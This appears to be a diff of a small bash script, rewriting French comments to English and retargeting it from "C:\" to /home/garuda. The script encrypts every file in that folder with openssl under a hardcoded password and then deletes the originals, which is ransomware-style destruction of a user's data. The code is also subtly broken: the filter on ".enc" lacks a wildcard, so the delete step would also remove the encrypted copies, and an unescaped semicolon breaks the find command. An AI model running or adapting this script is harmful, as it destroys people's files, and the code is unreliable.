@@ -1,11 +1,13 @@
+#!/bin/bash
 
+# Folder to encrypt files from
+folder="/home/garuda"
 
-v#!/bin/bash
-# Dossier à chiffrer
-folder="C:\"
-# Clé de chiffrement
+# Encryption key
 key="my_secret_password_password"
-# Chiffrer tous les fichiers dans le dossier
-find $folder -type f -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k $key \;
-# Supprimer les fichiers originaux
-find $folder -type f -not -name "*.enc" -delete
+
+# Encrypt all files in the folder
+find "$folder" -type f -not -name ".enc" -exec openssl enc -aes-256-cbc -salt -in {} -out {}.enc -k "$key" ;
+
+# Delete original files
+find "$folder" -type f -not -name ".enc" -delete
